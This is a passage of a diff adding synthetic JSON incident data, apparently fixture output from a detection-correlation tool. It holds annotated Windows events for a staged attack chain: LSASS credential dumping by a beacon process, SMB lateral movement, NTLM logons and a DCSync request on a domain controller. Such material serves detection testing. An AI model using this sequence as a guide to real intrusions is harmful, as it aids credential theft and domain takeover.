+          "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Users\\victim\\AppData\\Local\\Temp\\beacon.exe+1234",
+          "LogonId": "0x1A2B3C",
+          "RuleName": "technique_id=T1003.001,technique_name=LSASS Memory"
+        },
+        "process_guid": "",
+        "parent_process_guid": "",
+        "logon_id": "0x1A2B3C",
+        "source_ip": "",
+        "dest_ip": "",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "c95ade33-ded1-4de7-8bc2-c5316b962c30"
+      },
+      {
+        "rule_id": "012187a9-ce82-47eb-8417-607d02057aab",
+        "rule_name": "technique_id=T1003.001,technique_name=LSASS Memory",
+        "mitre_technique": "T1003.001",
+        "mitre_tactic": "credential_access",
+        "timestamp": "2026-10-28T09:02:01+00:00",
+        "hostname": "WORKSTATION01.corp.local",
+        "username": "",
+        "severity": "critical",
+        "raw_event": {
+          "_comment": "PHASE 3: Credential dump \u2014 Mimikatz-style sekurlsa::logonpasswords output indicator",
+          "EventType": "ProcessAccess",
+          "EventID": 10,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "WORKSTATION01.corp.local",
+          "TimeCreated": "2026-10-28T09:02:01.0000000Z",
+          "SourceProcessId": 4300,
+          "SourceProcessGUID": "{aaaa0001-0003-6720-0100-000000030000}",
+          "SourceImage": "C:\\Users\\victim\\AppData\\Local\\Temp\\beacon.exe",
+          "SourceUser": "CORP\\victim",
+          "TargetProcessId": 672,
+          "TargetProcessGUID": "{aaaa0001-0000-6720-0100-000000000050}",
+          "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+          "TargetUser": "NT AUTHORITY\\SYSTEM",
+          "GrantedAccess": "0x1438",
+          "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Users\\victim\\AppData\\Local\\Temp\\beacon.exe+5678",
+          "LogonId": "0x1A2B3C",
+          "RuleName": "technique_id=T1003.001,technique_name=LSASS Memory"
+        },
+        "process_guid": "",
+        "parent_process_guid": "",
+        "logon_id": "0x1A2B3C",
+        "source_ip": "",
+        "dest_ip": "",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "d4220a3b-3c35-4ca1-9ff0-cecfc8669f32"
+      },
+      {
+        "rule_id": "48047b7b-63d7-4d13-abf7-c9279e0d79aa",
+        "rule_name": "Security Alert",
+        "mitre_technique": "",
+        "mitre_tactic": "",
+        "timestamp": "2026-10-28T09:05:00+00:00",
+        "hostname": "WORKSTATION01.corp.local",
+        "username": "CORP\\victim",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 4: Lateral Movement \u2014 network connection to SERVER01 (SMB/PsExec)",
+          "EventType": "NetworkConnect",
+          "EventID": 3,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "WORKSTATION01.corp.local",
+          "TimeCreated": "2026-10-28T09:05:00.0000000Z",
+          "ProcessId": 4300,
+          "ProcessGUID": "{aaaa0001-0003-6720-0100-000000030000}",
+          "Image": "C:\\Users\\victim\\AppData\\Local\\Temp\\beacon.exe",
+          "User": "CORP\\victim",
+          "Protocol": "tcp",
+          "Initiated": true,
+          "SourceIsIpv6": false,
+          "SourceIp": "10.0.1.10",
+          "SourceHostname": "WORKSTATION01.corp.local",
+          "SourcePort": 49400,
+          "DestinationIsIpv6": false,
+          "DestinationIp": "10.0.1.20",
+          "DestinationHostname": "SERVER01.corp.local",
+          "DestinationPort": 445,
+          "DestinationPortName": "microsoft-ds",
+          "LogonId": "0x1A2B3C"
+        },
+        "process_guid": "{aaaa0001-0003-6720-0100-000000030000}",
+        "parent_process_guid": "",
+        "logon_id": "0x1A2B3C",
+        "source_ip": "10.0.1.10",
+        "dest_ip": "10.0.1.20",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "5365b48a-ce7e-457f-9515-11e51b405b84"
+      }
+    ],
+    "entities": [
+      {
+        "entity_type": "process",
+        "entity_id": "workstation01.corp.local|{aaaa0001-0003-6720-0100-000000030000}",
+        "attributes": {
+          "hostname": "WORKSTATION01.corp.local",
+          "raw_guid": "{aaaa0001-0003-6720-0100-000000030000}"
+        }
+      },
+      {
+        "entity_type": "process",
+        "entity_id": "workstation01.corp.local|{aaaa0001-0001-6720-0100-000000010000}",
+        "attributes": {
+          "hostname": "WORKSTATION01.corp.local",
+          "raw_guid": "{aaaa0001-0001-6720-0100-000000010000}"
+        }
+      },
+      {
+        "entity_type": "ip",
+        "entity_id": "203.0.113.100",
+        "attributes": {
+          "direction": "destination"
+        }
+      },
+      {
+        "entity_type": "ip",
+        "entity_id": "10.0.1.20",
+        "attributes": {
+          "direction": "destination"
+        }
+      },
+      {
+        "entity_type": "user",
+        "entity_id": "corp\\victim",
+        "attributes": {
+          "domain": "corp",
+          "samaccountname": "victim",
+          "is_machine_account": false
+        }
+      },
+      {
+        "entity_type": "ip",
+        "entity_id": "10.0.1.10",
+        "attributes": {
+          "direction": "source"
+        }
+      },
+      {
+        "entity_type": "process",
+        "entity_id": "workstation01.corp.local|{aaaa0001-0000-6720-0100-000000000500}",
+        "attributes": {
+          "hostname": "WORKSTATION01.corp.local",
+          "raw_guid": "{aaaa0001-0000-6720-0100-000000000500}",
+          "is_parent": true
+        }
+      },
+      {
+        "entity_type": "host",
+        "entity_id": "workstation01.corp.local",
+        "attributes": {}
+      },
+      {
+        "entity_type": "logon_session",
+        "entity_id": "workstation01.corp.local|0x1a2b3c",
+        "attributes": {
+          "hostname": "WORKSTATION01.corp.local"
+        }
+      },
+      {
+        "entity_type": "process",
+        "entity_id": "workstation01.corp.local|{aaaa0001-0002-6720-0100-000000020000}",
+        "attributes": {
+          "hostname": "WORKSTATION01.corp.local",
+          "raw_guid": "{aaaa0001-0002-6720-0100-000000020000}"
+        }
+      }
+    ],
+    "blast_radius": {
+      "hosts_touched": 1,
+      "accounts_used": 1,
+      "privilege_level_reached": "standard",
+      "lateral_movement_hops": 0
+    },
+    "playbook_recommendations": [
+      "playbooks/credential_theft.yml",
+      "playbooks/malware_execution.yml"
+    ]
+  },
+  {
+    "incident_id": "a9e5235b-f232-45d3-a8bd-e12f8afa4117",
+    "score": 0.25,
+    "severity": "low",
+    "start_time": "2026-10-28T09:10:02+00:00",
+    "end_time": "2026-10-28T09:12:00+00:00",
+    "techniques": [],
+    "tactics": [],
+    "hosts": [
+      "DC01.corp.local"
+    ],
+    "users": [
+      "Administrator"
+    ],
+    "alert_count": 2,
+    "alerts": [
+      {
+        "rule_id": "af67b759-1ac6-4628-a435-579af8c9567e",
+        "rule_name": "Security Alert",
+        "mitre_technique": "",
+        "mitre_tactic": "",
+        "timestamp": "2026-10-28T09:10:02+00:00",
+        "hostname": "DC01.corp.local",
+        "username": "Administrator",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 5: Network logon on DC01 \u2014 lateral movement from SERVER01",
+          "EventType": "LogonSuccess",
+          "EventID": 4624,
+          "Channel": "Security",
+          "Computer": "DC01.corp.local",
+          "TimeCreated": "2026-10-28T09:10:02.0000000Z",
+          "SubjectUserSid": "S-1-0-0",
+          "SubjectUserName": "-",
+          "SubjectDomainName": "-",
+          "SubjectLogonId": "0x0",
+          "TargetUserSid": "S-1-5-21-3623811015-3361044348-30300820-500",
+          "TargetUserName": "Administrator",
+          "TargetDomainName": "CORP",
+          "TargetLogonId": "0xAB1234",
+          "LogonType": 3,
+          "LogonProcessName": "NtLmSsp",
+          "AuthenticationPackageName": "NTLM",
+          "WorkstationName": "SERVER01",
+          "LogonGuid": "{00000000-0000-0000-0000-000000000000}",
+          "TransmittedServices": "-",
+          "LmPackageName": "NTLM V2",
+          "KeyLength": 128,
+          "ProcessId": 0,
+          "ProcessName": "-",
+          "IpAddress": "10.0.1.20",
+          "IpPort": "50200",
+          "ImpersonationLevel": "%%1833",
+          "LogonId": "0xAB1234"
+        },
+        "process_guid": "",
+        "parent_process_guid": "",
+        "logon_id": "0xAB1234",
+        "source_ip": "10.0.1.20",
+        "dest_ip": "",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "0bd3726b-c55c-4909-a055-7f5085aa6aec"
+      },
+      {
+        "rule_id": "5fcd04c6-b309-4566-9d6a-ff7c93538b60",
+        "rule_name": "Security Alert",
+        "mitre_technique": "",
+        "mitre_tactic": "",
+        "timestamp": "2026-10-28T09:12:00+00:00",
+        "hostname": "DC01.corp.local",
+        "username": "",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 5: DCSync replication request from DC01 (attacker using beacon3 on DC)",
+          "EventType": "DirectoryServiceAccess",
+          "EventID": 4662,
+          "Channel": "Security",
+          "Computer": "DC01.corp.local",
+          "TimeCreated": "2026-10-28T09:12:00.0000000Z",
+          "SubjectUserSid": "S-1-5-21-3623811015-3361044348-30300820-500",
+          "SubjectUserName": "Administrator",
+          "SubjectDomainName": "CORP",
+          "SubjectLogonId": "0xAB1234",
+          "ObjectServer": "DS",
+          "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
+          "ObjectName": "%{bf967a86-0de6-11d0-a285-00aa003049e2}",
+          "OperationType": "Object Access",
+          "HandleId": "0x0",
+          "AccessList": "%%7688",
+          "AccessMask": "0x100",
+          "Properties": "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}",
+          "AdditionalInfo": "-",
+          "AdditionalInfo2": "",
+          "LogonId": "0xAB1234"
+        },
+        "process_guid": "",
+        "parent_process_guid": "",
+        "logon_id": "0xAB1234",
+        "source_ip": "",
+        "dest_ip": "",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "897fda3c-dac8-494b-ad6a-484df02a49ca"
+      }
+    ],
+    "entities": [
+      {
+        "entity_type": "host",
+        "entity_id": "dc01.corp.local",
+        "attributes": {}
+      },
+      {
+        "entity_type": "user",
+        "entity_id": "_local\\administrator",
+        "attributes": {
+          "domain": "_local",
+          "samaccountname": "administrator",
+          "is_machine_account": false
+        }
+      },
+      {
+        "entity_type": "logon_session",
+        "entity_id": "dc01.corp.local|0xab1234",
+        "attributes": {
+          "hostname": "DC01.corp.local"
+        }
+      },
+      {
+        "entity_type": "ip",
+        "entity_id": "10.0.1.20",
+        "attributes": {
+          "direction": "destination"
+        }
+      }
+    ],
+    "blast_radius": {
+      "hosts_touched": 1,
+      "accounts_used": 1,
+      "privilege_level_reached": "high",
+      "lateral_movement_hops": 0
+    },
+    "playbook_recommendations": []
+  },
+  {
+    "incident_id": "e91e837e-049c-4fb8-8750-7459c35d1d12",
+    "score": 0.17,
+    "severity": "low",
+    "start_time": "2026-10-28T09:05:02+00:00",
+    "end_time": "2026-10-28T09:05:02+00:00",
+    "techniques": [],
+    "tactics": [],
+    "hosts": [
+      "SERVER01.corp.local"
+    ],
+    "users": [
+      "admin"
+    ],
+    "alert_count": 1,
+    "alerts": [
+      {
+        "rule_id": "05467cc5-5558-43b5-87c9-67254edb3be5",
+        "rule_name": "Security Alert",
+        "mitre_technique": "",
+        "mitre_tactic": "",
+        "timestamp": "2026-10-28T09:05:02+00:00",
+        "hostname": "SERVER01.corp.local",
+        "username": "admin",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 4: Network logon on SERVER01 \u2014 corresponds to lateral movement from WORKSTATION01",
+          "EventType": "LogonSuccess",
+          "EventID": 4624,
+          "Channel": "Security",
+          "Computer": "SERVER01.corp.local",
+          "TimeCreated": "2026-10-28T09:05:02.0000000Z",
+          "SubjectUserSid": "S-1-0-0",
+          "SubjectUserName": "-",
+          "SubjectDomainName": "-",
+          "SubjectLogonId": "0x0",
+          "TargetUserSid": "S-1-5-21-3623811015-3361044348-30300820-1109",
+          "TargetUserName": "admin",
+          "TargetDomainName": "CORP",
+          "TargetLogonId": "0x7C8D9E",
+          "LogonType": 3,
+          "LogonProcessName": "NtLmSsp",
+          "AuthenticationPackageName": "NTLM",
+          "WorkstationName": "WORKSTATION01",
+          "LogonGuid": "{00000000-0000-0000-0000-000000000000}",
+          "TransmittedServices": "-",
+          "LmPackageName": "NTLM V2",
+          "KeyLength": 128,
+          "ProcessId": 0,
+          "ProcessName": "-",
+          "IpAddress": "10.0.1.10",
+          "IpPort": "49400",
+          "ImpersonationLevel": "%%1833",
+          "LogonId": "0x7C8D9E"
+        },
+        "process_guid": "",
+        "parent_process_guid": "",
+        "logon_id": "0x7C8D9E",
+        "source_ip": "10.0.1.10",
+        "dest_ip": "",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "4586aa1c-983f-48cf-9eb1-12e902606f26"
+      }
+    ],
+    "entities": [
+      {
+        "entity_type": "logon_session",
+        "entity_id": "server01.corp.local|0x7c8d9e",
+        "attributes": {
+          "hostname": "SERVER01.corp.local"
+        }
+      },
+      {
+        "entity_type": "host",
+        "entity_id": "server01.corp.local",
+        "attributes": {}
+      },
+      {
+        "entity_type": "user",
+        "entity_id": "_local\\admin",
+        "attributes": {
+          "domain": "_local",
+          "samaccountname": "admin",
+          "is_machine_account": false
+        }
+      },
+      {
+        "entity_type": "ip",
+        "entity_id": "10.0.1.10",
+        "attributes": {
+          "direction": "source"
+        }
+      }
+    ],
+    "blast_radius": {
+      "hosts_touched": 1,
+      "accounts_used": 1,
+      "privilege_level_reached": "high",
+      "lateral_movement_hops": 0
+    },
+    "playbook_recommendations": []
+  }
+]
